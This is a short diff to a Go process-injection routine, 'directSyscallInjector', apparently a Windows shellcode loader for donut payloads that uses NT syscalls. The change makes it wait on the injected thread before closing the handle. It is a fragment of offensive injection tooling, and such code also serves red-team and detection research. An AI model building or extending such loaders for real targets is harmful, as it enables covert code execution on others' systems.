@@ -416,9 +416,23 @@ func directSyscallInjector(payload []byte, pid uint32) error {
 
 	fmt.Printf("Created thread: %s\n", winapi.FormatNTStatus(status))
 
-	if hThread != 0 {
-		winapi.NtClose(hThread)
+	// Wait for the thread to complete (important for donut payloads that need time to execute)
+	fmt.Printf("Waiting for thread to complete...\n")
+	
+	// Wait indefinitely for the thread to finish
+	// Using nil timeout means wait forever
+	waitStatus, err := winapi.NtWaitForSingleObject(hThread, false, nil)
+	
+	if err != nil {
+		fmt.Printf("Warning: NtWaitForSingleObject error: %v\n", err)
+	} else if waitStatus == winapi.STATUS_SUCCESS {
+		fmt.Printf("Thread completed successfully: %s\n", winapi.FormatNTStatus(waitStatus))
+	} else {
+		fmt.Printf("Thread wait returned: %s\n", winapi.FormatNTStatus(waitStatus))
 	}
+	
+	// Close the thread handle
+	winapi.NtClose(hThread)
 
 	return nil
 }
